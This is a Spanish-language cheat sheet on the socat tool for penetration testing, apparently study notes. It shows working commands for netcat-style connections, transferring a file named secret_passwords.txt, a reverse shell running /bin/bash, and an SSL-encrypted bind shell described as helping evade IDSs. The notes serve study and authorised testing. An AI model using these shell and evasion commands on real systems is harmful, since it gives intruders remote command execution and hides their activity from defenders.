@@ -1,0 +1,92 @@
+### Socat
+Socat
+
+Establece dos byte streams bidireccionales y transfiere datos entre ellos. Similar a Netcat
+
+1. Netcat vs Socat
+
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc <ip> <port> 						# Netcat connection
+
+socat - TCP4:<ip>:<port>			# Socat connection
+-------------------------------------------------------------
+sudo nc -lvp localhost 443			# Netcat escuchando
+
+sudo socat TCP4-LISEN:443 STDOUT	# Socat escuchando
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+# Socat requiere añadir el protocolo de escucha (TCP4-LISTEN) y el argumento STDOUT para redirigir la salida estándar.
+
+# Se necesita ejecutar con sudo para hacer un bind de puertos por debajo del 1024.
+
+2. Socat file transfers
+
+Se pueden enviar ficheros con socat también.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt				# Origen
+
+socat TCP4:127.0.0.1:443 file:received_secret_passwords.txt,create		# Destino
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+• TCP4-LISTEN → Especifíca un Listener IPv4
+• TCP4 → Especifíca IPv4
+• fork → Crea un proceso hijo una vez la conexión se ha realizado con el listener, que permite conexiones múltiples
+• file → Especifíca el nombre del fichero que se va a transferir en el que envía, o el nombre del archivo que se va a guardar en el que lo recibe.
+• create → Especifíca que se debe crear un nuevo fichero.
+
+3. Socat Reverse Shells
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+socat -d -d TCP4-LISTEN:443 STDOUT			# Se inicia escucha en el puerto 443
+
+socat TCP4:127.0.0.1:443 EXEC:/bin/bash		# Ejecuta la reverse shell 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+• -d -d → Incrementa verbosidad
+• STDOUT → Conecta salida estándar con el socket TCP
+• EXEC:<programa> → Ejecuta el programa especificado (como -e en Netcat)
+
+4. Socat Encrypted Bind Shells
+
+Se pueden encriptar las bind shell utilizando certificados SSL, lo que ayuda a evadir IDSs y a esconder datos sensibles.
+
+• openssl → Crea un certificado autofirmado
+   ◇ req → Inicia una nueva petición de firma de certificado
+   ◇ -newkey → Genera nueva clave privada
+   ◇ rsa:2048 → Utilia encriptación RSA con 2048 bits de longitud de clave
+   ◇ -nodes → Guarda la clave privada sin protección de contraseña
+   ◇ -keyout <file> → Guarda la clave en el fichero especificado
+   ◇ -x509 → Saca un certificado autofirmado en lugar de una petición de certificado
+   ◇ -days <n> → Asigna una validez de ‘n’ días al certificado
+   ◇ -out <file> → Guarda el certificado en un fichero 
+ 
+ Socat necesita un tipo de certificado específico, .pem, por lo que hay que convertir el .key y .crt obtenidos de openssl en un .pem combinando ambos
+ 
+ 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt		# Creamos el certificado y clave
+
+cat bind_shell.key bind_shell.crt > bind_shell.pem			# Combinamos ambos para generar el .pem 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+ Una vez hecho esto podemos conectarnos de la siguiente forma
+ 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash				# Escucha en puerto 443 
+ 
+socat - OPENSSL:10.11.0.4:443,verify=0							# Conexión con el bash de la otra maquina
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+•  OPENSSL-LISTEN → Crea listener
+• OPENSSL → Establece una conexión remota por SSL a un listener
+• cert=<ruta.pem> → Especifíca el certificado a utilizar
+• verify=0 → Deshabilita verificación SSL
+
